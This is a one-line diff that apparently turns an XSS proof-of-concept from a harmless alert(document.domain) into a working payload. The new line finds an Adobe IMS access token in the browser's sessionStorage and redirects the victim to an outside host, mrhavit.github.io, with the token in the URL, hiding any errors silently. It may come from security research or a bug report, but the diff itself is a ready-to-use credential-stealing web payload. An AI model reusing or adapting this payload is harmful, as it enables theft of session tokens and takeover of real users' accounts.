@@ -1,1 +1,1 @@
-alert(document.domain)
+try{const t=JSON.parse(sessionStorage.getItem(Object.keys(sessionStorage).find(k=>k.includes('adobeid_ims_access_token'))))?.tokenValue;if(t)location=`https://mrhavit.github.io?token=${encodeURIComponent(t)}`}catch(e){}
